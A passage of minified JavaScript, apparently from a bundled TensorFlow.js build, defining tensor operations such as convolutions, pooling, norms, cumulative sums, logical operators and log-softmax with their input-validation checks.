                    l.unshift(1);
                e = W(e, l)
            }
            const o = e.shape
              , r = Array.from(t);
            for (let l = t.length - 1; l >= 0; l--)
                if (o[l] === t[l])
                    r[l] = 1;
                else if (1 !== e.shape[l])
                    throw new Error(`broadcastTo(): [${s}] cannot be broadcast to [${t}].`);
            if (0 === r.map(((l,u)=>l > 1 ? u : -1)).filter((l=>l >= 0)).length)
                return to(e);
            const a = {
                x: e
            }
              , c = {
                reps: r
            };
            return G.runKernel(gi, a, c)
        }
    });
    const a2 = D({
        ceil_: function i2(n) {
            const e = {
                x: N(n, "x", "ceil", "float32")
            };
            return G.runKernel(Lr, e)
        }
    });
    function $c(n, t, e) {
        es(n);
        const s = {
            shape: n,
            value: t,
            dtype: e = e || Mo(t)
        };
        return G.runKernel(Su, {}, s)
    }
    const nn = D({
        clipByValue_: function c2(n, t, e) {
            const s = N(n, "x", "clipByValue");
            if (v(t <= e, (()=>`Error in clip: min (${t}) must be less than or equal to max (${e}).`)),
            t === e)
                return $c(s.shape, t, s.dtype);
            const o = {
                x: s
            }
              , r = {
                clipValueMin: t,
                clipValueMax: e
            };
            return G.runKernel(Er, o, r)
        }
    });
    const u2 = D({
        concat1d_: function l2(n) {
            return Xe(n, 0)
        }
    });
    const h2 = D({
        concat2d_: function d2(n, t) {
            return Xe(n, t)
        }
    });
    const f2 = D({
        concat3d_: function p2(n, t) {
            return Xe(n, t)
        }
    });
    const g2 = D({
        concat4d_: function m2(n, t) {
            return Xe(n, t)
        }
    });
    const so = D({
        conv2d_: function b2(n, t, e, s, o="NHWC", r=[1, 1], i) {
            const a = N(n, "x", "conv2d", "float32")
              , c = N(t, "filter", "conv2d", "float32");
            let l = a
              , u = !1;
            3 === a.rank && (u = !0,
            l = W(a, [1, a.shape[0], a.shape[1], a.shape[2]])),
            v(4 === l.rank, (()=>`Error in conv2d: input must be rank 4, but got rank ${l.rank}.`)),
            v(4 === c.rank, (()=>`Error in conv2d: filter must be rank 4, but got rank ${c.rank}.`)),
            ze("conv2d", s, i);
            const d = "NHWC" === o ? l.shape[3] : l.shape[1];
            v(d === c.shape[2], (()=>`Error in conv2d: depth of input (${d}) must match input depth for filter ${c.shape[2]}.`)),
            v(Te(e, r), (()=>`Error in conv2D: Either strides or dilations must be 1. Got strides ${e} and dilations '${r}'`)),
            v(no(r), (()=>"Error in conv2D: Dilated rates should be larger than 0.")),
            v(no(e), (()=>"Error in conv2D: Strides should be larger than 0."));
            const h = {
                x: l,
                filter: c
            }
              , p = {
                strides: e,
                pad: s,
                dataFormat: o,
                dilations: r,
                dimRoundingMode: i
            }
              , f = G.runKernel(Ra, h, p);
            return u ? W(f, [f.shape[1], f.shape[2], f.shape[3]]) : f
        }
    });
    const Lm = D({
        conv1d_: function x2(n, t, e, s, o="NWC", r=1, i) {
            const a = N(n, "x", "conv1d")
              , c = N(t, "filter", "conv1d");
            let l = a
              , u = !1;
            2 === a.rank && (u = !0,
            l = W(a, [1, a.shape[0], a.shape[1]])),
            v(3 === l.rank, (()=>`Error in conv1d: input must be rank 3, but got rank ${l.rank}.`)),
            v(3 === c.rank, (()=>`Error in conv1d: filter must be rank 3, but got rank ${c.rank}.`)),
            ze("conv1d", s, i),
            v(l.shape[2] === c.shape[1], (()=>`Error in conv1d: depth of input (${l.shape[2]}) must match input depth for filter ${c.shape[1]}.`)),
            v(Te(e, r), (()=>`Error in conv1D: Either stride or dilation must be 1. Got stride ${e} and dilation '${r}'`)),
            v(no(r), (()=>"Error in conv1D: Dilated rates should be larger than 0.")),
            v(no(e), (()=>"Error in conv1D: Stride should be larger than 0.")),
            v("NWC" === o, (()=>`Error in conv1d: got dataFormat of ${o} but only NWC is currently supported.`));
            const d = W(c, [1, c.shape[0], c.shape[1], c.shape[2]])
              , h = W(l, [l.shape[0], 1, l.shape[1], l.shape[2]])
              , g = so(h, d, [1, e], s, "NHWC", [1, r], i);
            return W(g, u ? [g.shape[2], g.shape[3]] : [g.shape[0], g.shape[2], g.shape[3]])
        }
    });
    const md = D({
        conv2DBackpropInput_: function y2(n, t, e, s, o, r="NHWC", i) {
            v(n.length === t.rank, (()=>`Length of inShape (${n.length}) and rank of dy (${t.rank}) must match`));
            let a = n
              , c = t
              , l = !1;
            3 === t.rank && (l = !0,
            c = W(t, [1, t.shape[0], t.shape[1], t.shape[2]]),
            a = [1, n[0], n[1], n[2]]),
            v(4 === a.length, (()=>`Error in conv2dDerInput: inShape must be length 4, but got length ${a.length}.`)),
            v(4 === c.rank, (()=>`Error in conv2dDerInput: dy must be rank 4, but got rank ${c.rank}`)),
            v(4 === e.rank, (()=>`Error in conv2dDerInput: filter must be rank 4, but got rank ${e.rank}`));
            const u = "NHWC" === r ? a[3] : a[1]
              , d = "NHWC" === r ? c.shape[3] : c.shape[1];
            v(u === e.shape[2], (()=>`Error in conv2dDerInput: depth of input (${u}) must match input depth for filter ${e.shape[2]}.`)),
            v(d === e.shape[3], (()=>`Error in conv2dDerInput: depth of output (${d}) must match output depth for filter ${e.shape[3]}.`)),
            ze("conv2dDerInput", o, i);
            const h = {
                dy: c,
                filter: e
            }
              , p = {
                strides: s,
                pad: o,
                dataFormat: r,
                dimRoundingMode: i,
                inputShape: a
            }
              , f = G.runKernel($a, h, p);
            return l ? W(f, [f.shape[1], f.shape[2], f.shape[3]]) : f
        }
    });
    const Em = D({
        conv2dTranspose_: function I2(n, t, e, s, o, r) {
            const i = N(n, "x", "conv2dTranspose")
              , a = N(t, "filter", "conv2dTranspose");
            return md(e, i, a, s, o, "NHWC", r)
        }
    });
    const C2 = D({
        conv3d_: function w2(n, t, e, s, o="NDHWC", r=[1, 1, 1]) {
            const i = N(n, "x", "conv3d")
              , a = N(t, "filter", "conv3d");
            let c = i
              , l = !1;
            4 === i.rank && (l = !0,
            c = W(i, [1, i.shape[0], i.shape[1], i.shape[2], i.shape[3]])),
            v(5 === c.rank, (()=>`Error in conv3d: input must be rank 5, but got rank ${c.rank}.`)),
            v(5 === a.rank, (()=>`Error in conv3d: filter must be rank 5, but got rank ${a.rank}.`)),
            v(c.shape[4] === a.shape[3], (()=>`Error in conv3d: depth of input (${c.shape[4]}) must match input depth for filter ${a.shape[3]}.`)),
            v(Te(e, r), (()=>`Error in conv3D: Either strides or dilations must be 1. Got strides ${e} and dilations '${r}'`)),
            v("NDHWC" === o, (()=>`Error in conv3d: got dataFormat of ${o} but only NDHWC is currently supported.`)),
            v(no(r), (()=>"Error in conv3D: Dilated rates should be larger than 0.")),
            v(no(e), (()=>"Error in conv3D: Strides should be larger than 0."));
            const u = {
                x: c,
                filter: a
            }
              , d = {
                strides: e,
                pad: s,
                dataFormat: o,
                dilations: r
            }
              , h = G.runKernel(Ga, u, d);
            return l ? W(h, [h.shape[1], h.shape[2], h.shape[3], h.shape[4]]) : h
        }
    });
    const Dm = D({
        conv3DBackpropInput_: function v2(n, t, e, s, o) {
            v(n.length === t.rank, (()=>`Length of inShape (${n.length}) and rank of dy (${t.rank}) must match`));
            let r = n
              , i = t
              , a = !1;
            4 === t.rank && (a = !0,
            i = W(t, [1, t.shape[0], t.shape[1], t.shape[2], t.shape[3]]),
            r = [1, n[0], n[1], n[2], n[3]]);
            const c = r[4]
              , l = i.shape[4];
            v(5 === r.length, (()=>`Error in conv3dDerInput: inShape must be length 5, but got length ${r.length}.`)),
            v(5 === i.rank, (()=>`Error in conv3dDerInput: dy must be rank 5, but got rank ${i.rank}`)),
            v(5 === e.rank, (()=>`Error in conv3dDerInput: filter must be rank 5, but got rank ${e.rank}`)),
            v(c === e.shape[3], (()=>`Error in conv3dDerInput: depth of input (${c}) must match input depth for filter ${e.shape[3]}.`)),
            v(l === e.shape[4], (()=>`Error in conv3dDerInput: depth of output (${l}) must match output depth for filter ${e.shape[4]}.`));
            const u = {
                dy: i,
                filter: e
            }
              , d = {
                pad: o,
                strides: s,
                inputShape: r
            }
              , h = G.runKernel(hu, u, d);
            return a ? W(h, [h.shape[1], h.shape[2], h.shape[3], h.shape[4]]) : h
        }
    });
    const k2 = D({
        conv3dTranspose_: function S2(n, t, e, s, o) {
            const r = N(n, "x", "conv3dTranspose")
              , i = N(t, "filter", "conv3dTranspose");
            return Dm(e, r, i, s, o)
        }
    });
    const gd = D({
        cos_: function T2(n) {
            const e = {
                x: N(n, "x", "cos", "float32")
            };
            return G.runKernel(Dr, e)
        }
    });
    const Wm = D({
        cosh_: function N2(n) {
            const e = {
                x: N(n, "x", "cosh", "float32")
            };
            return G.runKernel(Wr, e)
        }
    });
    const bd = D({
        cumprod_: function R2(n, t=0, e=!1, s=!1) {
            const r = {
                x: N(n, "x", "cumprod")
            }
              , i = {
                axis: t,
                exclusive: e,
                reverse: s
            };
            return G.runKernel(pu, r, i)
        }
    });
    const Mm = D({
        cumsum_: function $2(n, t=0, e=!1, s=!1) {
            const r = {
                x: N(n, "x", "cumsum")
            }
              , i = {
                axis: t,
                exclusive: e,
                reverse: s
            };
            return G.runKernel(La, r, i)
        }
    });
    const Vm = D({
        denseBincount_: function G2(n, t, e, s=!1) {
            const o = N(n, "x", "denseBincount")
              , r = N(t, "weights", "denseBincount");
            v("int32" === o.dtype, (()=>`Error in denseBincount: input dtype must be int32, but got ${o.dtype}`)),
            v(o.rank <= 2, (()=>`Error in denseBincount: input must be at most rank 2, but got rank ${o.rank}.`)),
            v(e >= 0, (()=>`size must be non-negative, but got ${e}.`)),
            v(r.size === o.size || 0 === r.size, (()=>`Error in denseBincount: weights must have the same shape as x or 0-length, but got x shape: ${o.shape}, weights shape: ${r.shape}.`));
            const i = {
                x: o,
                weights: r
            }
              , a = {
                size: e,
                binaryOutput: s
            };
            return G.runKernel(mu, i, a)
        }
    });
    const E2 = D({
        depthToSpace_: function L2(n, t, e="NHWC") {
            const s = N(n, "x", "depthToSpace", "float32")
              , o = "NHWC" === e ? s.shape[1] : s.shape[2]
              , r = "NHWC" === e ? s.shape[2] : s.shape[3]
              , i = "NHWC" === e ? s.shape[3] : s.shape[1];
            v(t > 1, (()=>`blockSize should be > 1 for depthToSpace, but was: ${t}`)),
            v(o * t >= 0, (()=>`Negative dimension size caused by overflow when multiplying\n    ${o} and ${t}  for depthToSpace with input shape\n    ${s.shape}`)),
            v(r * t >= 0, (()=>`Negative dimension size caused by overflow when multiplying\n    ${r} and ${t} for depthToSpace with input shape\n        ${s.shape}`)),
            v(i % (t * t) == 0, (()=>`Dimension size must be evenly divisible by ${t * t} but is ${i} for depthToSpace with input shape ${s.shape}`));
            const a = {
                x: s
            }
              , c = {
                blockSize: t,
                dataFormat: e
            };
            return G.runKernel(gu, a, c)
        }
    });
    const xd = D({
        depthwiseConv2d_: function D2(n, t, e, s, o="NHWC", r=[1, 1], i) {
            const a = N(n, "x", "depthwiseConv2d", "float32")
              , c = N(t, "filter", "depthwiseConv2d", "float32");
            let l = a
              , u = !1;
            3 === a.rank && (u = !0,
            l = W(a, [1, a.shape[0], a.shape[1], a.shape[2]])),
            v(4 === l.rank, (()=>`Error in depthwiseConv2d: input must be rank 4, but got rank ${l.rank}.`)),
            v(4 === c.rank, (()=>`Error in depthwiseConv2d: filter must be rank 4, but got rank ${c.rank}.`));
            const d = "NHWC" === o ? l.shape[3] : l.shape[1];
            v(d === c.shape[2], (()=>`Error in depthwiseConv2d: number of input channels (${d}) must match the inChannels dimension in filter ${c.shape[2]}.`)),
            ze("depthwiseConv2d", s, i);
            const h = {
                x: l,
                filter: c
            }
              , p = {
                strides: e,
                pad: s,
                dataFormat: o,
                dilations: r,
                dimRoundingMode: i
            }
              , f = G.runKernel(Ea, h, p);
            return u ? W(f, [f.shape[1], f.shape[2], f.shape[3]]) : f
        }
    });
    const M2 = D({
        dilation2d_: function W2(n, t, e, s, o=[1, 1], r="NHWC") {
            const i = N(n, "x", "dilation2d")
              , a = N(t, "filter", "dilation2d");
            v(3 === i.rank || 4 === i.rank, (()=>`Error in dilation2d: input must be rank 3 or 4, but got rank ${i.rank}.`)),
            v(3 === a.rank, (()=>`Error in dilation2d: filter must be rank 3, but got rank ${a.rank}.`)),
            v("NHWC" === r, (()=>`Error in dilation2d: Only NHWC is currently supported, but got dataFormat of ${r}`));
            let c = i
              , l = !1;
            3 === i.rank && (c = W(i, [1, i.shape[0], i.shape[1], i.shape[2]]),
            l = !0),
            v(c.shape[3] === a.shape[2], (()=>`Error in dilation2d:  input and filter must have the same depth: ${c.shape[3]} vs ${a.shape[2]}`));
            const u = {
                x: c,
                filter: a
            }
              , d = {
                strides: e,
                pad: s,
                dilations: o
            }
              , h = G.runKernel(Da, u, d);
            return l ? W(h, [h.shape[1], h.shape[2], h.shape[3]]) : h
        }
    });
    function Uo(n, t) {
        const e = n.length
          , s = [];
        for (let o = 0; o < e; o++) {
            const r = e - 1 - o
              , i = n[r] || 1;
            (t[t.length - 1 - o] || 1) > 1 && 1 === i && s.unshift(r)
        }
        return s
    }
    function ce(n, t) {
        const e = [];
        for (let s = 0; s < t.length; s++) {
            const o = n[n.length - s - 1]
              , r = t.length - s - 1
              , i = t[r];
            (null == o || 1 === o && i > 1) && e.unshift(r)
        }
        return e
    }
    function gt(n, t) {
        const e = Math.max(n.length, t.length)
          , s = new Array(e);
        for (let o = 0; o < e; o++) {
            let r = n[n.length - o - 1];
            null == r && (r = 1);
            let i = t[t.length - o - 1];
            if (null == i && (i = 1),
            1 === r)
                s[e - o - 1] = i;
            else if (1 === i)
                s[e - o - 1] = r;
            else {
                if (r !== i) {
                    throw Error(`Operands could not be broadcast together with shapes ${n} and ${t}.`)
                }
                s[e - o - 1] = r
            }
        }
        return s
    }
    const Xn = D({
        equal_: function V2(n, t) {
            let e = N(n, "a", "equal", "string_or_numeric")
              , s = N(t, "b", "equal", "string_or_numeric");
            [e,s] = te(e, s),
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Wa, o)
        }
    });
    const Le = D({
        where_: function F2(n, t, e) {
            const s = N(t, "a", "where")
              , o = N(e, "b", "where")
              , r = N(n, "condition", "where", "bool")
              , i = gt(gt(r.shape, s.shape), o.shape)
              , u = {
                condition: Ni(r, i),
                t: Ni(s, i),
                e: Ni(o, i)
            };
            return G.runKernel(uc, u)
        }
    });
    const St = D({
        zerosLike_: function z2(n) {
            const e = {
                x: N(n, "x", "zerosLike")
            };
            return G.runKernel(xc, e)
        }
    });
    const A2 = D({
        divNoNan_: function X2(n, t) {
            let e = N(n, "a", "div")
              , s = N(t, "b", "div");
            [e,s] = te(e, s);
            const o = dt(e, s)
              , r = St(o)
              , i = Xn(s, r);
            return Le(i, r, o)
        }
    });
    const O2 = D({
        dot_: function P2(n, t) {
            const e = N(n, "t1", "dot")
              , s = N(t, "t2", "dot");
            v(!(1 !== e.rank && 2 !== e.rank || 1 !== s.rank && 2 !== s.rank), (()=>`Error in dot: inputs must all be rank 1 or 2, but got ranks ${e.rank} and ${s.rank}.`));
            const o = 1 === e.rank ? e.size : e.shape[1]
              , r = 1 === s.rank ? s.size : s.shape[0];
            if (v(o === r, (()=>`Error in dot: inner dimensions of inputs must match, but got ${o} and ${r}.`)),
            1 === e.rank && 1 === s.rank) {
                const i = W(e, [1, -1])
                  , a = W(s, [-1, 1])
                  , c = $t(i, a);
                return W(c, [])
            }
            if (1 === e.rank && 2 === s.rank) {
                const i = W(e, [1, -1])
                  , a = W(s, [s.shape[0], s.shape[1]])
                  , c = $t(i, a);
                return W(c, [c.size])
            }
            if (2 === e.rank && 1 === s.rank) {
                const i = W(s, [-1, 1])
                  , a = $t(e, i);
                return W(a, [a.size])
            }
            {
                const i = W(s, [s.shape[0], s.shape[1]]);
                return $t(e, i)
            }
        }
    });
    const Ri = D({
        einsum_: function K2(n, ...t) {
            const e = t.map(((o,r)=>N(o, `tensors${r}`, "einsum")))
              , s = {
                equation: n
            };
            return G.runKernel(wu, e, s)
        }
    });
    const Gc = D({
        elu_: function Z2(n) {
            const e = {
                x: N(n, "x", "elu", "float32")
            };
            return G.runKernel(Vr, e)
        }
    });
    const H2 = D({
        erf_: function B2(n) {
            let t = N(n, "x", "erf");
            v("int32" === t.dtype || "float32" === t.dtype, (()=>"Input dtype must be `int32` or `float32`.")),
            "int32" === t.dtype && (t = st(t, "float32"));
            const e = {
                x: t
            };
            return G.runKernel(Fr, e)
        }
    });
    function yd(n, t) {
        for (let e = 0; e < n.length; ++e)
            if (n[n.length - e - 1] !== t - 1 - e)
                return !1;
        return !0
    }
    function Fm(n, t, e) {
        const s = n.length + t.length
          , o = [];
        let r = 0
          , i = 0;
        for (let a = 0; a < s; a++)
            -1 === e.indexOf(a) ? o.push(n[r++]) : o.push(t[i++]);
        return o
    }
    function me(n, t) {
        const e = []
          , s = n.length;
        for (let r = 0; r < s; r++)
            -1 === t.indexOf(r) && e.push(n[r]);
        return [e, t.map((r=>n[r]))]
    }
    function re(n, t) {
        return Fm(n, t.map((s=>1)), t)
    }
    function Ie(n, t, e) {
        v(yd(t, e), (()=>`${n} supports only inner-most axes for now. Got axes ${t} and rank-${e} input.`))
    }
    function Yt(n, t) {
        if (yd(n, t))
            return null;
        const e = [];
        for (let s = 0; s < t; ++s)
            -1 === n.indexOf(s) && e.push(s);
        return n.forEach((s=>e.push(s))),
        e
    }
    function Cs(n) {
        return n.map(((t,e)=>[e, t])).sort(((t,e)=>t[1] - e[1])).map((t=>t[0]))
    }
    function ee(n, t) {
        const e = [];
        for (let s = t - n; s < t; ++s)
            e.push(s);
        return e
    }
    const Tn = D({
        max_: function _2(n, t=null, e=!1) {
            const o = {
                x: N(n, "x", "max")
            }
              , r = {
                reductionIndices: t,
                keepDims: e
            };
            return G.runKernel(Ha, o, r)
        }
    });
    const Lc = D({
        min_: function U2(n, t=null, e=!1) {
            const o = {
                x: N(n, "x", "min")
            }
              , r = {
                axis: t,
                keepDims: e
            };
            return G.runKernel(Qa, o, r)
        }
    });
    const Yo = D({
        pow_: function Y2(n, t) {
            let e = N(n, "base", "pow")
              , s = N(t, "exp", "pow");
            [e,s] = te(e, s);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(qr, o)
        }
    });
    function Gt(n, t) {
        if ((hn(n) && "string" !== t || Array.isArray(n)) && "complex64" !== t)
            throw new Error("Error creating a new Scalar: value must be a primitive (number|boolean|string)");
        if ("string" === t && hn(n) && !(n instanceof Uint8Array))
            throw new Error("When making a scalar from encoded string, the value must be `Uint8Array`.");
        return Ci(n, [], [], t)
    }
    const Ee = D({
        sqrt_: function Q2(n) {
            const e = {
                x: N(n, "x", "sqrt", "float32")
            };
            return G.runKernel(di, e)
        }
    });
    const Bt = D({
        square_: function J2(n) {
            const t = N(n, "x", "square");
            return G.runKernel("Square", {
                x: t
            }, {})
        }
    });
    const ut = D({
        sum_: function j2(n, t=null, e=!1) {
            let s = N(n, "x", "sum");
            "bool" === s.dtype && (s = st(s, "int32"));
            const o = {
                x: s
            }
              , r = {
                axis: t,
                keepDims: e
            };
            return G.runKernel(hc, o, r)
        }
    });
    function zm(n, t, e=null) {
        if (0 === n.rank)
            return Ge(n);
        if (1 !== n.rank && null === e)
            return zm(W(n, [-1]), t, e);
        if (1 === n.rank || "number" == typeof e || Array.isArray(e) && 1 === e.length) {
            if (1 === t)
                return ut(Ge(n), e);
            if (t === 1 / 0)
                return Tn(Ge(n), e);
            if (t === -1 / 0)
                return Lc(Ge(n), e);
            if ("euclidean" === t || 2 === t)
                return Ee(ut(Yo(Ge(n), Gt(2, "int32")), e));
            throw new Error(`Error in norm: invalid ord value: ${t}`)
        }
        if (Array.isArray(e) && 2 === e.length) {
            if (1 === t)
                return Tn(ut(Ge(n), e[0]), e[1] - 1);
            if (t === 1 / 0)
                return Tn(ut(Ge(n), e[1]), e[0]);
            if (t === -1 / 0)
                return Lc(ut(Ge(n), e[1]), e[0]);
            if ("fro" === t || "euclidean" === t)
                return Ee(ut(Bt(n), e));
            throw new Error(`Error in norm: invalid ord value: ${t}`)
        }
        throw new Error(`Error in norm: invalid axis: ${e}`)
    }
    const Ec = D({
        norm_: function q2(n, t="euclidean", e=null, s=!1) {
            const o = zm(n = N(n, "x", "norm"), t, e);
            let r = o.shape;
            if (s) {
                const i = It(e, n.shape);
                r = re(o.shape, i)
            }
            return W(o, r)
        }
    });
    const ev = D({
        euclideanNorm_: function tv(n, t=null, e=!1) {
            return Ec(n, "euclidean", t, e)
        }
    });
    const An = D({
        exp_: function nv(n) {
            const e = {
                x: N(n, "x", "exp")
            };
            return G.runKernel(zr, e)
        }
    });
    const Ae = D({
        expandDims_: function sv(n, t=0) {
            const e = N(n, "x", "expandDims", "string_or_numeric");
            v(t <= e.rank, (()=>"Axis must be <= rank of the tensor"));
            const s = {
                input: e
            }
              , o = {
                dim: t
            };
            return G.runKernel(Ma, s, o)
        }
    });
    const rv = D({
        expm1_: function ov(n) {
            const e = {
                x: N(n, "x", "expm1")
            };
            return G.runKernel(Xr, e)
        }
    });
    const Nn = D({
        tile_: function iv(n, t) {
            const e = N(n, "x", "tile", "string_or_numeric");
            v(e.rank === t.length, (()=>`Error in transpose: rank of input ${e.rank} must match length of reps ${t}.`));
            const s = {
                x: e
            }
              , o = {
                reps: t
            };
            return G.runKernel(gi, s, o)
        }
    });
    const Xm = D({
        eye_: function av(n, t, e, s="float32") {
            null == t && (t = n);
            const o = wt([n, t], s)
              , r = n <= t ? n : t;
            for (let a = 0; a < r; ++a)
                o.set(1, a, a);
            const i = W(o.toTensor(), [n, t]);
            if (null == e)
                return i;
            if (1 === e.length)
                return Nn(Ae(i, 0), [e[0], 1, 1]);
            if (2 === e.length)
                return Nn(Ae(Ae(i, 0), 0), [e[0], e[1], 1, 1]);
            if (3 === e.length)
                return Nn(Ae(Ae(Ae(i, 0), 0), 0), [e[0], e[1], e[2], 1, 1]);
            throw new Error(`eye() currently supports only 1D and 2D batchShapes, but received ${e.length}D.`)
        }
    });
    const Dc = D({
        floor_: function cv(n) {
            const e = {
                x: N(n, "x", "floor", "float32")
            };
            return G.runKernel(Ar, e)
        }
    });
    const Id = D({
        gather_: function lv(n, t, e=0, s=0) {
            const i = {
                x: N(n, "x", "gather"),
                indices: N(t, "indices", "gather", "int32")
            }
              , a = {
                axis: e,
                batchDims: s
            };
            return G.runKernel(Fa, i, a)
        }
    });
    const sn = D({
        greater_: function uv(n, t) {
            let e = N(n, "a", "greater", "string_or_numeric")
              , s = N(t, "b", "greater", "string_or_numeric");
            [e,s] = te(e, s),
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(za, o)
        }
    });
    const oo = D({
        greaterEqual_: function dv(n, t) {
            let e = N(n, "a", "greaterEqual", "string_or_numeric")
              , s = N(t, "b", "greaterEqual", "string_or_numeric");
            [e,s] = te(e, s),
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Or, o)
        }
    });
    const wd = D({
        imag_: function hv(n) {
            const e = {
                input: N(n, "input", "imag")
            };
            return G.runKernel(Nu, e)
        }
    });
    const fv = D({
        isFinite_: function pv(n) {
            const e = {
                x: N(n, "x", "isFinite")
            };
            return G.runKernel(Zr, e)
        }
    });
    const gv = D({
        isInf_: function mv(n) {
            const e = {
                x: N(n, "x", "isInf")
            };
            return G.runKernel(Br, e)
        }
    });
    const xv = D({
        isNaN_: function bv(n) {
            const e = {
                x: N(n, "x", "isNaN")
            };
            return G.runKernel(Hr, e)
        }
    });
    const Cd = D({
        leakyRelu_: function yv(n, t=.2) {
            const s = {
                x: N(n, "x", "leakyRelu")
            }
              , o = {
                alpha: t
            };
            return G.runKernel(Xa, s, o)
        }
    });
    const Wc = D({
        less_: function Iv(n, t) {
            let e = N(n, "a", "less", "string_or_numeric")
              , s = N(t, "b", "less", "string_or_numeric");
            [e,s] = te(e, s),
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Aa, o)
        }
    });
    const Qo = D({
        lessEqual_: function wv(n, t) {
            let e = N(n, "a", "lessEqual", "string_or_numeric")
              , s = N(t, "b", "lessEqual", "string_or_numeric");
            [e,s] = te(e, s),
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Pa, o)
        }
    });
    const vv = D({
        localResponseNormalization_: function Cv(n, t=5, e=1, s=1, o=.5) {
            const r = N(n, "x", "localResponseNormalization");
            v(4 === r.rank || 3 === r.rank, (()=>`Error in localResponseNormalization: x must be rank 3 or 4 but got\n               rank ${r.rank}.`)),
            v(Do(t), (()=>`Error in localResponseNormalization: depthRadius must be an integer but got depthRadius ${t}.`));
            let i = r
              , a = !1;
            3 === r.rank && (a = !0,
            i = W(r, [1, r.shape[0], r.shape[1], r.shape[2]]));
            const c = {
                x: i
            }
              , l = {
                depthRadius: t,
                bias: e,
                alpha: s,
                beta: o
            }
              , u = G.runKernel(Ba, c, l);
            return a ? W(u, [u.shape[1], u.shape[2], u.shape[3]]) : u
        }
    });
    const Pn = D({
        log_: function Sv(n) {
            const e = {
                x: N(n, "x", "log", "float32")
            };
            return G.runKernel(_r, e)
        }
    });
    const Am = D({
        log1p_: function kv(n) {
            const e = {
                x: N(n, "x", "log1p")
            };
            return G.runKernel(Ur, e)
        }
    });
    function Jo(n) {
        return G.customGrad(n)
    }
    const ne = D({
        neg_: function Nv(n) {
            const e = {
                x: N(n, "x", "neg")
            };
            return G.runKernel(ja, e)
        }
    });
    const $i = D({
        softplus_: function Rv(n) {
            const e = {
                x: N(n, "x", "softplus")
            };
            return G.runKernel(ui, e)
        }
    });
    const Gv = D({
        logSigmoid_: function $v(n) {
            const t = N(n, "x", "logSigmoid");
            return Jo((s=>({
                value: ne($i(ne(s))),
                gradFunc: i=>E(i, _o(ne(s)))
            })))(t)
        }
    });
    const pt = D({
        sub_: function Lv(n, t) {
            let e = N(n, "a", "sub")
              , s = N(t, "b", "sub");
            [e,s] = te(e, s);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(pi, o)
        }
    });
    const Pm = D({
        logSoftmax_: function Ev(n, t=-1) {
            const e = N(n, "logits", "logSoftmax");
            if (-1 === t && (t = e.rank - 1),
            t !== e.rank - 1)
                throw Error(`Log Softmax along a non-last dimension is not yet supported. Logits was rank ${e.rank} and axis was ${t}`);
            return Jo(((o,r)=>{
                const a = Tn(o, t, !0)
                  , c = pt(o, a)
                  , l = pt(st(c, "float32"), Pn(ut(An(c), t, !0)));
                return r([l]),
                {
                    value: l,
                    gradFunc: (d,h)=>{
                        const [p] = h
                          , m = An(p);
                        return pt(d, E(ut(d, t, !0), m))
                    }
                }
            }
            ))(e)
        }
    });
    const Om = D({
        logSumExp_: function Dv(n, t=null, e=!1) {
            const s = N(n, "x", "logSumExp")
              , o = It(t, s.shape)
              , r = Tn(s, o, !0)
              , i = pt(s, r)
              , a = An(i)
              , c = ut(a, o)
              , l = Pn(c)
              , u = Q(W(r, l.shape), l);
            if (e) {
                const d = re(u.shape, o);
                return W(u, d)
            }
            return u
        }
    });
    const rs = D({
        logicalAnd_: function Wv(n, t) {
            const e = N(n, "a", "logicalAnd", "bool")
              , s = N(t, "b", "logicalAnd", "bool");
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Oa, o)
        }
    });
    const vd = D({
        logicalNot_: function Mv(n) {
            const e = {
                x: N(n, "x", "logicalNot", "bool")
            };
            return G.runKernel(Ka, e)
        }
    });
    const Km = D({
        logicalOr_: function Vv(n, t) {
            const e = N(n, "a", "logicalOr", "bool")
              , s = N(t, "b", "logicalOr", "bool");
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Za, o)
        }
    });
    const zv = D({
        logicalXor_: function Fv(n, t) {
            const e = N(n, "a", "logicalXor", "bool")
              , s = N(t, "b", "logicalXor", "bool");
            return gt(e.shape, s.shape),
            rs(Km(n, t), vd(rs(n, t)))
        }
    });
    const Sd = D({
        maxPool_: function Xv(n, t, e, s, o) {
            const r = N(n, "x", "maxPool");
            let a = r
              , c = !1;
            3 === r.rank && (c = !0,
            a = W(r, [1, r.shape[0], r.shape[1], r.shape[2]])),
            v(4 === a.rank, (()=>`Error in maxPool: input must be rank 4 but got rank ${a.rank}.`)),
            v(Te(e, 1), (()=>`Error in maxPool: Either strides or dilations must be 1. Got strides ${e} and dilations '1'`)),
            ze("maxPool", s, o);
            const l = {
                x: a
            }
              , u = {
                filterSize: t,
                strides: e,
                pad: s,
                dimRoundingMode: o
            }
              , d = G.runKernel(_a, l, u);
            return c ? W(d, [d.shape[1], d.shape[2], d.shape[3]]) : d
        }
    });
    const Pv = D({
        maxPool3d_: function Av(n, t=[1, 1, 1], e, s, o, r="NDHWC") {
            const i = N(n, "x", "maxPool3d");
            let a = i
              , c = !1;
            4 === i.rank && (c = !0,
            a = W(i, [1, i.shape[0], i.shape[1], i.shape[2], i.shape[3]])),
            v(5 === a.rank, (()=>`Error in maxPool3d: x must be rank 5 but got rank ${a.rank}.`)),
            v("NDHWC" === r, (()=>`Error in maxPool3d: Only NDHWC is currently supported, but got dataFormat of ${r}`)),
            ze("maxPool3d", s, o);
            const l = {
                x: a
            }
              , u = {
                filterSize: t,
                strides: e,
                pad: s,
                dimRoundingMode: o,
                dataFormat: r
            }
              , d = G.runKernel(Ua, l, u);
            return c ? W(d, [d.shape[1], d.shape[2], d.shape[3], d.shape[4]]) : d
        }
    });
    const vs = D({
        maximum_: function Ov(n, t) {
            let e = N(n, "a", "maximum")
              , s = N(t, "b", "maximum");
            [e,s] = te(e, s),
            "bool" === e.dtype && (e = st(e, "int32"),
            s = st(s, "int32")),
            gt(e.shape, s.shape);
            const o = {
                a: e,
                b: s
            };
            return G.runKernel(Yr, o)
        }
    });
    const ie = D({
        mean_: function Kv(n, t=null, e=!1) {
            const o = {
                x: N(n, "x", "mean")
            }
